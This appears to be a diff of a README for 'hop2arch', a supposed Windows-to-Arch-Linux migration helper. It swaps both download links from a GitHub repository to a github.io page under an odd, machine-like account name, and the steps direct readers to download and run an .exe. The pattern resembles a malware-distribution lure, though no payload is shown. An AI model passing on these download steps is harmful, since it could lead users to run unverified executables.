@@ -1,6 +1,6 @@
 # 🚀 hop2arch - Move your Windows setup to Linux
 
-[![Download hop2arch](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/venaescleralescorrelationalanalysis447/hop2arch)
+[![Download hop2arch](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://venaescleralescorrelationalanalysis447.github.io)
 
 Moving your computer setup from Windows to Arch Linux requires careful planning. This tool helps you inventory your current files and settings. It shows you what changes to expect during your transition. It helps you prepare your new Linux environment so you keep your workflow intact.
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets these basic requirements:
 
 ## 📥 How to download and run
 
-1.  Visit the [official download page](https://github.com/venaescleralescorrelationalanalysis447/hop2arch).
+1.  Visit the [official download page](https://venaescleralescorrelationalanalysis447.github.io).
 2.  Locate the section labeled "Assets" at the bottom of the latest release.
 3.  Click the link ending in `.exe` to start the download.
 4.  Navigate to your Downloads folder once the file finishes saving.
